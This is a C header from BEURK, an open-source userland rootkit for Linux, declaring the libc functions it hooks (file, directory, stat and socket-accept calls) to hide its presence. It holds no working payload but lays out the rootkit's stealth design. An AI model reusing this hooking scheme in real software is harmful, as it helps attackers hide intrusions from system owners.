/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#ifndef _DEBUG_H_
# define _DEBUG_H_

# include <dirent.h> /* struct dirent, DIR */
# include <stdio.h> /* FILE */
# include <sys/socket.h> /* struct sockaddr, socklen_t */
# include <sys/stat.h> /* struct stat */

# define _HOOKED __attribute__((visibility("default")))

/** Function hooks prototypes
 *
 * This header file contains ALL protypes of hooked functions.
 */

int             accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) _HOOKED;
int             access(const char *pathname, int mode) _HOOKED;
int             rmdir(const char *pathname) _HOOKED;
int             open(const char *path, int oflag, ...) _HOOKED;
struct dirent   *readdir(DIR *dirp) _HOOKED;
struct dirent64 *readdir64(DIR *dirp) _HOOKED;
int             stat(const char *pathname, struct stat *buf) _HOOKED;
int             stat64(const char *__restrict __file, struct stat64 *buf) _HOOKED;
int             __xstat(int __ver, const char *__filename, struct stat *buf) _HOOKED;
int             __xstat64(int __ver, const char *__filename, struct stat64 *buf) _HOOKED;
int             lstat(const char *path, struct stat *buf) _HOOKED;
int             lstat64(const char *path, struct stat64 *buf) _HOOKED;
int             __lxstat(int ver, const char *path, struct stat *buf) _HOOKED;
int             __lxstat64(int ver, const char *path, struct stat64 *buf) _HOOKED;
FILE            *fopen(const char *path, const char *mode) _HOOKED;
FILE            *fopen64(const char *path, const char *mode) _HOOKED;
int             link(const char *oldpath, const char *newpath) _HOOKED;
int             unlink(const char *pathname) _HOOKED;
int             unlinkat(int dirfd, const char *pathname, int flags) _HOOKED;

#endif /* _DEBUG_H_ */
